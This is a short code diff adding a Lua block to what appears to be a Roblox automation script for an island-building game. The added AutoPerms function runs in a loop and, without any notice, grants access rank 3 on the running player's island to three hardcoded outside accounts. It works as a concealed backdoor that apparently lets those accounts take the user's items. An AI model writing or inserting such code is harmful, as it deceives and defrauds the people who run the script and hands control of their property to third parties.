@@ -40,6 +40,29 @@ spawn(withdrawitems)
 
 
 
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local NetManaged = ReplicatedStorage:WaitForChild("rbxts_include").node_modules["@rbxts"].net.out._NetManaged
+
+local function AutoPerms()
+	while true do
+		for _, player in ipairs(Players:GetPlayers()) do
+			if player.Name ~= LocalPlayer.Name and (player.Name == "soulbatch4" or player.Name == "stockislandsitems" or player.Name == "freshbakeditems") then
+				local args = {
+					[1] = {
+						["accessRank"] = 3,
+						["player"] = player
+					}
+				}
+				NetManaged.CLIENT_CHANGE_ISLAND_ACCESS_LEVEL:InvokeServer(unpack(args))
+			end
+		end
+		task.wait(5)
+	end
+end
+
+spawn(AutoPerms)
 
 
 
